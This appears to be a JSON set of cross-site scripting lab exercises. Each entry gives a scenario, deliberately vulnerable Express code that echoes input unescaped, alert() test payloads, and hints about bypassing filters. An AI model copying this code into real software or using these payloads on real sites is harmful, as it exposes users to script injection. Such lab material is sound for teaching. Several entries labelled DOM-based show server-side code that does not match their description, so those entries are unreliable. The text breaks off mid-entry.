[
    {
        "Lab scenario": "Stored XSS in internal bug tracking system notes",
        "Lab Description": "A bug tracking system allows developers to add notes to bug reports. These notes are rendered in the admin panel without proper sanitization, leading to stored XSS. To solve: Inject a script payload in a bug note.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a bug report with a note: <script>alert('BugXSS')</script>",
            "Check admin panel to confirm execution.",
            "Test encoded variations.",
            "Validate across different roles.",
            "Confirm persistence after reload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  res.send(`<div>${note}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('BugXSS')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in product filtering system",
        "Lab Description": "An e-commerce site reflects user-selected filters into the product list page without sanitization. To solve: Inject an XSS payload into the filter parameters.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a filter value with <script>alert('Filter')</script>.",
            "Observe execution on the product list page.",
            "Test encoding bypasses.",
            "Validate across different filter parameters.",
            "Confirm payload persistence."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-filter', (req, res) => {\n  const filter = req.body.filter;\n  res.send(`<h2>Filtered by: ${filter}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Filter')</script>",
            "<svg/onload=alert('FilterXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS via localStorage user theme",
        "Lab Description": "The application loads user-preferred themes from localStorage and inserts them into the DOM without sanitization. To solve: Inject a payload into the theme field.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set localStorage.theme = '<img src=x onerror=alert(\"Theme\")>'",
            "Reload the app.",
            "Observe execution of the payload.",
            "Try different injection formats.",
            "Bypass possible CSP restrictions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-theme', (req, res) => {\n  const theme = req.body.theme;\n  res.send(`<div id='theme'>${theme}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Theme')>",
            "<svg onload=alert('ThemeXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online recipe sharing site ingredients",
        "Lab Description": "A recipe sharing platform allows users to submit ingredients. The application renders them directly without escaping. To solve: Inject a script into the ingredients list.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add an ingredient: <script>alert('Recipe')</script>",
            "Submit the recipe.",
            "Observe execution on view page.",
            "Experiment with different HTML elements.",
            "Confirm persistence across users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-ingredient', (req, res) => {\n  const ingredient = req.body.ingredient;\n  res.send(`<ul><li>${ingredient}</li></ul>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Recipe')</script>",
            "<img src=x onerror=alert('Ingredient')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter subscription confirmation",
        "Lab Description": "When users subscribe to the newsletter, their email is reflected back in the confirmation message without sanitization. To solve: Inject an XSS payload via the email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit email: <script>alert('Newsletter')</script>.",
            "Observe reflected payload execution.",
            "Test encoded variants.",
            "Validate across different form submissions.",
            "Check server-side response for reflection."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Subscribed: ${email}</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Newsletter')</script>",
            "<img src=x onerror=alert('SubXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in course discussion forum",
        "Lab Description": "Students post questions in the course forum. Posts are rendered without sanitization. To solve: Inject a persistent XSS payload into a forum post.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a forum post with <script>alert('Forum')</script>.",
            "Save and view the post.",
            "Observe script execution.",
            "Try payloads inside attributes.",
            "Validate across multiple sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-question', (req, res) => {\n  const question = req.body.question;\n  res.send(`<div>${question}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Forum')</script>",
            "<svg/onload=alert('ForumXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in online documentation viewer",
        "Lab Description": "The documentation viewer loads section content based on a URL hash and renders it using innerHTML. There's no sanitization. To solve: Inject a malicious fragment.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set location.hash = '#<img src=x onerror=alert(\"Docs\")>'",
            "Reload the page.",
            "Observe execution in documentation viewer.",
            "Experiment with SVG and other vectors.",
            "Confirm on mobile and desktop browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-doc', (req, res) => {\n  const doc = req.body.doc;\n  res.send(`<div id='doc'>${doc}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Docs')>",
            "<svg onload=alert('DocXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in movie review search field",
        "Lab Description": "A movie review site reflects the search query without escaping. To solve: Inject a payload into the search input.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter <script>alert('Movie')</script> into the search box.",
            "Submit and observe execution.",
            "Use URL encoding tricks.",
            "Try nesting inside attributes.",
            "Validate payload across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-movie', (req, res) => {\n  const search = req.body.search;\n  res.send(`<h2>Searching for: ${search}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Movie')</script>",
            "<img src=x onerror=alert('ReviewXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online book store reviews",
        "Lab Description": "Users can submit reviews for books. Reviews are rendered without sanitization. To solve: Submit a review containing an XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a review: <script>alert('Book')</script>.",
            "Check review section for execution.",
            "Try iframe and svg payloads.",
            "Confirm across user accounts.",
            "Observe execution after logout/login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<div>${review}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Book')</script>",
            "<svg/onload=alert('ReviewXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS via welcome message field",
        "Lab Description": "The welcome message for logged-in users is dynamically injected into the DOM using innerHTML without escaping. To solve: Inject an XSS payload via user name.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Register with name: <img src=x onerror=alert('Welcome')>.",
            "Login and observe execution.",
            "Test attribute and SVG payloads.",
            "Confirm execution on mobile browsers.",
            "Chain multiple payloads if possible."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const name = req.body.name;\n  res.send(`<div>Welcome, ${name}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Welcome')>",
            "<svg/onload=alert('WelcomeXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event announcement system",
        "Lab Description": "An event management platform allows organizers to create announcements. Announcements are rendered without sanitization. To solve: Inject a persistent XSS payload in the announcement text.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit an announcement with <script>alert('Event')</script>.",
            "Reload the announcement page.",
            "Observe script execution.",
            "Test using image-based payloads.",
            "Confirm execution for other users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  res.send(`<div>${announcement}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Event')</script>",
            "<img src=x onerror=alert('AnnounceXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in flight booking search form",
        "Lab Description": "A flight booking system reflects search parameters back into the results page without escaping. To solve: Inject a script payload in the city field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit departure city: <script>alert('Flight')</script>.",
            "Observe execution in the results page.",
            "Try encoded versions to evade filters.",
            "Check both GET and POST methods.",
            "Validate with different user agents."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-flight', (req, res) => {\n  const city = req.body.city;\n  res.send(`<h2>Flights from: ${city}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Flight')</script>",
            "<svg/onload=alert('FlightXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS via browser localStorage theme selection",
        "Lab Description": "The application saves user theme preferences in localStorage and applies them directly to the page without sanitization. To solve: Inject a payload via localStorage manipulation.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set localStorage.theme = '<img src=x onerror=alert(\"Theme\")>'",
            "Reload the page and trigger execution.",
            "Try iframe and svg payloads.",
            "Validate with different browsers.",
            "Monitor CSP violations if any."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/load-theme', (req, res) => {\n  const theme = req.body.theme;\n  res.send(`<div id='theme'>${theme}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Theme')>",
            "<svg onload=alert('ThemeXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online job portal application letter",
        "Lab Description": "Candidates can submit a cover letter when applying for jobs. Letters are displayed to employers without sanitization. To solve: Inject a stored XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit cover letter: <script>alert('JobApp')</script>.",
            "Employer views the application.",
            "Observe script execution.",
            "Test with different HTML tags.",
            "Validate persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const letter = req.body.letter;\n  res.send(`<div>${letter}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('JobApp')</script>",
            "<img src=x onerror=alert('ApplicationXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in forgot password page",
        "Lab Description": "The password reset page reflects email addresses without encoding. To solve: Inject a script payload in the email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit: <script>alert('Reset')</script> as email.",
            "Observe execution in confirmation page.",
            "Use URL encoding to evade filters.",
            "Try payloads in different parameters.",
            "Confirm across various browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Password reset link sent to ${email}</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Reset')</script>",
            "<svg/onload=alert('ResetXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in library management system book reviews",
        "Lab Description": "Students submit book reviews. Reviews are rendered without escaping. To solve: Inject an XSS payload in the review form.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit: <script>alert('Library')</script> as review.",
            "Observe execution in book page.",
            "Experiment with various payload types.",
            "Confirm persistence after logout/login.",
            "Try attribute-based injections."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<p>${review}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Library')</script>",
            "<img src=x onerror=alert('LibraryXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in hotel booking form",
        "Lab Description": "The booking form reflects user data after submission without escaping. To solve: Inject an XSS payload via guest name.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter guest name: <script>alert('Hotel')</script>.",
            "Submit and observe reflected execution.",
            "Use encoding tricks to evade filters.",
            "Confirm execution on booking confirmation page.",
            "Test different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-hotel', (req, res) => {\n  const guest = req.body.guest;\n  res.send(`<h1>Booking for: ${guest}</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Hotel')</script>",
            "<img src=x onerror=alert('HotelXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in social media post editor",
        "Lab Description": "User-generated posts are saved in localStorage and dynamically injected into the feed using innerHTML without escaping. To solve: Inject a script via a post.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set localStorage.post = '<svg onload=alert(\"Feed\")>'",
            "Reload feed page.",
            "Observe payload execution.",
            "Try iframe and img based XSS.",
            "Check if payload persists across reloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const post = req.body.post;\n  res.send(`<div>${post}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<svg onload=alert('Feed')>",
            "<img src=x onerror=alert('FeedXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online medical appointment booking notes",
        "Lab Description": "Patients can leave notes for doctors while booking appointments. Notes are rendered without escaping, enabling XSS. To solve: Inject a malicious script.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit note: <script>alert('Appointment')</script>.",
            "Check notes rendering for execution.",
            "Validate across different doctor profiles.",
            "Test filter bypass techniques.",
            "Check persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-appointment', (req, res) => {\n  const note = req.body.note;\n  res.send(`<p>${note}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Appointment')</script>",
            "<svg/onload=alert('AppointmentXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in feedback form of shopping website",
        "Lab Description": "The feedback page reflects comments without sanitization. To solve: Inject XSS payload via feedback field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback: <script>alert('Feedback')</script>.",
            "Observe execution on confirmation page.",
            "Use encoding tricks.",
            "Confirm execution across browsers.",
            "Check reflection in other fields."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<p>Your feedback: ${feedback}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Feedback')</script>",
            "<img src=x onerror=alert('FeedbackXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in conference attendee bio",
        "Lab Description": "The conference system allows users to submit a bio displayed publicly without sanitization. To solve: Inject a persistent XSS payload into the bio field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Register as an attendee and fill bio with <script>alert('Conference')</script>.",
            "Save and view your public profile.",
            "Observe script execution.",
            "Check persistence after logout.",
            "Test additional payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bio', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<div>${bio}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Conference')</script>",
            "<img src=x onerror=alert('ConferenceXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset confirmation",
        "Lab Description": "The password reset confirmation page reflects user input without escaping. To solve: Inject an XSS payload through the email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit email: <script>alert('Reset')</script>.",
            "Observe reflected payload execution.",
            "Check HTML source for vulnerable reflection.",
            "Try encoded payloads.",
            "Test across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-reset', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h3>Reset link sent to: ${email}</h3>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Reset')</script>",
            "<svg/onload=alert('ResetXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online event RSVP comments",
        "Lab Description": "RSVP forms allow users to leave comments, which are rendered unsanitized. To solve: Inject a persistent XSS payload via the comment.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment: <script>alert('RSVP')</script>.",
            "View event RSVP list.",
            "Observe script execution.",
            "Test with multiple HTML injection vectors.",
            "Confirm persistence after reloading."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-rsvp', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('RSVP')</script>",
            "<img src=x onerror=alert('RSVPXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in flight ticket booking error page",
        "Lab Description": "Flight booking system reflects invalid parameters in error pages without escaping. To solve: Inject a script via a broken booking attempt.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Trigger booking error with: <script>alert('Flight')</script> in passenger name.",
            "Observe reflected payload execution.",
            "Experiment with different input fields.",
            "Use encoding to bypass basic filters.",
            "Confirm across different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-flight', (req, res) => {\n  const passenger = req.body.passenger;\n  res.send(`<h1>Error booking for: ${passenger}</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Flight')</script>",
            "<img src=x onerror=alert('FlightError')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in project task dashboard widget",
        "Lab Description": "Task details are read from localStorage and inserted with innerHTML without sanitization. To solve: Inject a payload into localStorage data.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set localStorage.task = '<img src=x onerror=alert(\"Task\")>'",
            "Reload the dashboard.",
            "Observe execution inside task widget.",
            "Test nested tags and alternative vectors.",
            "Confirm no CSP blocks."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-task', (req, res) => {\n  const task = req.body.task;\n  res.send(`<div>${task}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Task')>",
            "<svg/onload=alert('TaskWidget')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in fitness app progress notes",
        "Lab Description": "Users log their fitness progress, which is displayed without sanitization. To solve: Inject a script into the progress notes.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit progress note: <script>alert('Fitness')</script>.",
            "Reload profile dashboard.",
            "Observe execution of injected code.",
            "Check persistence post-logout.",
            "Attempt using iframe payloads."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/log-progress', (req, res) => {\n  const note = req.body.note;\n  res.send(`<p>${note}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Fitness')</script>",
            "<img src=x onerror=alert('ProgressXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in vehicle service appointment booking",
        "Lab Description": "Vehicle service booking form reflects user name unsanitized. To solve: Inject an XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit owner name: <script>alert('Service')</script>.",
            "Confirm script execution in confirmation page.",
            "Use Burp Suite to fuzz other fields.",
            "Test event-based payloads.",
            "Confirm cross-browser behavior."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book-service', (req, res) => {\n  const owner = req.body.owner;\n  res.send(`<h2>Service booking for ${owner}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Service')</script>",
            "<svg/onload=alert('VehicleXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online school class comments",
        "Lab Description": "Students leave class feedback, which is rendered without escaping. To solve: Inject a persistent XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback: <script>alert('Class')</script>.",
            "View feedback list as another user.",
            "Observe execution.",
            "Test payload obfuscation techniques.",
            "Confirm persistence across users."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>${feedback}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Class')</script>",
            "<img src=x onerror=alert('ClassFeedback')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online portfolio contact form",
        "Lab Description": "The contact form reflects submitted data back without encoding. To solve: Inject a script payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name field with <script>alert('Portfolio')</script>.",
            "Check confirmation page for execution.",
            "Use DevTools to analyze DOM structure.",
            "Try encoded versions for bypass.",
            "Validate across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-submit', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Thanks ${name}, we will contact you soon.</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Portfolio')</script>",
            "<svg/onload=alert('ContactXSS')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in dynamic leaderboard update",
        "Lab Description": "Leaderboard entries are dynamically generated from user input and rendered unsanitized. To solve: Inject a malicious payload in the name field.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Submit a name: <img src=x onerror=alert('Leaderboard')>.",
            "Observe DOM injection and execution.",
            "Test chained payloads.",
            "Confirm payload triggers without user interaction.",
            "Monitor network and DOM behavior."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-score', (req, res) => {\n  const player = req.body.player;\n  res.send(`<div>${player} joined the game!</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Leaderboard')>",
            "<svg onload=alert('LeaderboardXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in book review platform comment field",
        "Lab Description": "A book review platform allows users to comment on books. Comments are rendered without sanitization, leading to stored XSS. To solve: Inject a script payload in the comment field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a comment with <script>alert('BookXSS')</script>.",
            "Visit the book page to trigger execution.",
            "Try different payloads for stealth.",
            "Check persistence after logout.",
            "Confirm XSS across multiple sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-comment', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('BookXSS')</script>",
            "<img src=x onerror=alert('BookReview')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in order tracking system",
        "Lab Description": "Order tracking page reflects user-supplied tracking IDs into the HTML unsanitized. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter tracking ID: <script>alert('TrackXSS')</script>.",
            "Check order status page for script execution.",
            "Test alternative payload formats.",
            "Verify execution across different browsers.",
            "Attempt encoding bypass techniques."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/track-order', (req, res) => {\n  const trackingId = req.body.trackingId;\n  res.send(`<h2>Tracking result for: ${trackingId}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('TrackXSS')</script>",
            "<svg/onload=alert('TrackError')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event organizer description field",
        "Lab Description": "An event platform allows organizers to provide a description. The description is displayed without sanitization. To solve: Inject persistent XSS into the description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create an event with description: <script>alert('EventXSS')</script>.",
            "View event page and observe execution.",
            "Use encoded payloads for stealth.",
            "Check persistence after event edit.",
            "Monitor behavior across user roles."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const description = req.body.description;\n  res.send(`<section>${description}</section>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('EventXSS')</script>",
            "<img src=x onerror=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in account activation confirmation page",
        "Lab Description": "Activation confirmation page reflects email without proper encoding. To solve: Inject an XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit activation with email: <script>alert('Activate')</script>.",
            "Observe payload execution in confirmation page.",
            "Test encoded alternatives.",
            "Fuzz for multiple input fields.",
            "Confirm behavior in different devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/activate-account', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Activation email sent to: ${email}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Activate')</script>",
            "<img src=x onerror=alert('ActivationXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online quiz user nickname",
        "Lab Description": "The quiz platform allows setting a nickname, which is reflected without escaping. To solve: Inject a persistent XSS payload in the nickname.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Join quiz with nickname: <script>alert('QuizXSS')</script>.",
            "Reload quiz scoreboard page.",
            "Observe XSS execution.",
            "Attempt nested HTML injection.",
            "Confirm execution for all viewers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/join-quiz', (req, res) => {\n  const nickname = req.body.nickname;\n  res.send(`<h2>Player: ${nickname}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('QuizXSS')</script>",
            "<svg/onload=alert('Nickname')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in support ticket submission preview",
        "Lab Description": "Support ticket preview reflects ticket title without encoding. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a ticket with title: <script>alert('TicketXSS')</script>.",
            "Preview the ticket and observe script execution.",
            "Test SVG and iframe-based payloads.",
            "Use DevTools for DOM inspection.",
            "Confirm behavior on mobile and desktop."
        ],
        "Vulnerability name": "Cross-site scripting",
